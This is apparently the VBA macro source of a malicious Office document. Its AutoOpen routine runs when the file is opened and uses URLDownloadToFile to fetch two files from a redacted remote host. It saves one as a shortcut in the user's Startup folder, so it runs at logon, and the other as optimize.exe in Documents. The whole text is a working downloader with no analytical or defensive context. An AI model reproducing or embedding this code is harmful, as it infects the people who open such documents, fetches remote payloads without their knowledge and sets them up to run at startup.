Option Explicit

#If VBA7 Then
    Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" ( _
        ByVal pCaller As LongPtr, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As LongPtr, _
        ByVal lpfnCB As LongPtr) As LongPtr
#Else
    Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" ( _
        ByVal pCaller As Long, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As Long, _
        ByVal lpfnCB As Long) As Long
#End If
    
Sub AutoOpen()

    Dim FileURL As String
    Dim DestinationFile As String
    
    FileURL = "https://api.XXXXXXXX.com/optimize.txt"
    DestinationFile = Environ("UserProfile") & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" & "optimize.lnk"
       
    URLDownloadToFile 0, FileURL, DestinationFile, 0, 0


    Dim FileURL2 As String
    Dim DestinationFile2 As String
    
    FileURL2 = "https://api.XXXXXXXX.com/opt.txt"
    DestinationFile2 = Environ("UserProfile") & "\Documents\" & "optimize.exe"
    
    URLDownloadToFile 0, FileURL2, DestinationFile2, 0, 0

End Sub
